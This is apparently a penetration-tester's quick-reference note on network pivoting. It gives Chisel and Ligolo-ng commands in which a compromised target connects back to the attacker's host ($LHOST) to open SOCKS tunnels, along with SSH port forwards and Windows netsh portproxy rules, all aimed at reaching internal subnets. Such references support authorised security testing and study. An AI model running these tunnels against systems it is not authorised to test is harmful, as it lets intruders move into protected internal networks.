# Network Pivoting Quick Reference

**Tags:** #pivoting #tunneling #socks #chisel #ligolo
**Full Guide:** [[06-Lateral-Movement/INDEX]] | [[00-Quick-Reference/Tunneling]] | [[00-Quick-Reference/Pivoting]]

---

## Chisel (Recommended)

```bash
# Kali server
./chisel server --reverse -p 8080

# Target client
./chisel client $LHOST:8080 R:socks      # SOCKS5 on Kali:1080
.\chisel.exe client $LHOST:8080 R:socks

# Forward specific port
./chisel client $LHOST:8080 R:5432:192.168.10.5:5432

# Proxychains config: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445 192.168.10.5
```

## Ligolo-ng (No Proxychains Needed)

```bash
# Kali: tun interface + proxy
sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Target agent
./agent -connect $LHOST:11601 -ignore-cert

# Ligolo console: session → start
sudo ip route add 192.168.10.0/24 dev ligolo
# Now access 192.168.10.x directly
```

## SSH Tunneling

```bash
ssh -N -D 1080 user@$TARGET              # SOCKS proxy
ssh -N -L 5432:internal:5432 user@$HOP  # Local forward
ssh -N -R 4444:127.0.0.1:4444 user@$TARGET  # Remote forward
```

## Netsh (Windows — No Binary)

```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.10.5 connectport=80
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
```

See full guide: [[06-Lateral-Movement/INDEX]]
